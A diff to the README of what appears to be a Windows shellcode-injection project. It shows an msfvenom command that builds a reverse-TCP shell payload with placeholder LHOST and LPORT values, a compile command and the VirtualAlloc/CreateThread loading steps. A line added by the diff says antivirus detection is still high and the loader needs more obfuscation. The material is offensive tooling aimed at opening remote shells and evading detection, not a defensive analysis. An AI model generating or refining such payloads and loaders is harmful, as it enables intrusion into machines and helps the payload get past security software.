@@ -14,19 +14,28 @@ Shellcode generated using `msfvenom`:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP LPORT=PORT -f c
 ````
 
+## ⚙️ Compilation
+Can be compiled using the simple compilation command :
+
+````bash
+g++ inject_code.cpp -o shell_code.exe
+````
+
 ## 🧠 How it Works
 1. Allocate memory with `VirtualAlloc`
 2. Copy shellcode to allocated region
 3. Run with `CreateThread`
 
-## 🖼️ Screenshots
-
-  ![Injection Demo](screenshot/analysis.png)
-
 ## 📁 File Structure
 
 * `main.cpp` — injection code
 * `shellcode.h` — contains unsigned char shellcode array
+
+## 🖼️ Screenshots
+
+  ![Injection Demo](screenshot/analysis.png)
+
+  We could see that the detection rate is still high and needs more appropriate procedure to obfuscate it.
 
 ## 📝 Note :
 
